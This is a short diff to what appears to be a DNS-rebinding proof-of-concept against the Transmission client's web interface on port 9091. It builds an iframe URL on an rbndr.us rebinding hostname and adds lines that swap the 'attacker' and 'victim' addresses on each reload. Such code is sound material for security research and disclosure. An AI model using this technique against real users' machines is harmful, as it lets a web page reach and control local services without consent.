@@ -40,6 +40,9 @@ function reloadFrame() {
 		+ convert_dotted_quad(victim)
 		+ ".rbndr.us:9091/transmission/iframe.html"
 		+ "?rnd=" + Math.random();
+		var tmp = attacker;
+		attacker = victim;
+		victim = tmp;
 }
 
 function begin() {
